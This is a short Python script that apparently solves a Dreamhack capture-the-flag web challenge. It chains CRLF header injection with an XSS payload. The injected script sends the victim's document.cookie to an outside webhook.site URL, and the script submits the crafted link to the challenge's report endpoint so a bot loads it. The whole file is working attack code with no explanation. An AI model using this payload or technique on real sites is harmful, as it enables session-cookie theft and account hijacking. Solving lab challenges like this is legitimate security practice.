import requests
from urllib.parse import quote
import json

url = "http://host3.dreamhack.games:16467/"

xss = '<script>location.href=`https://webhook.site/6785156f-3542-4773-a7c3-29ff987fdc40/${document.cookie}`</script>'

payload = {
    "context": {"user": "a"},
    "headers": {
        f"a\r\nContent-Type: text/html\r\n\r\n{xss}": "a"
    }
}

payload = quote(json.dumps(payload))

res = requests.post(f'{url}/api/report', json={
    'path': f'?data={payload}'
})

print(res.text)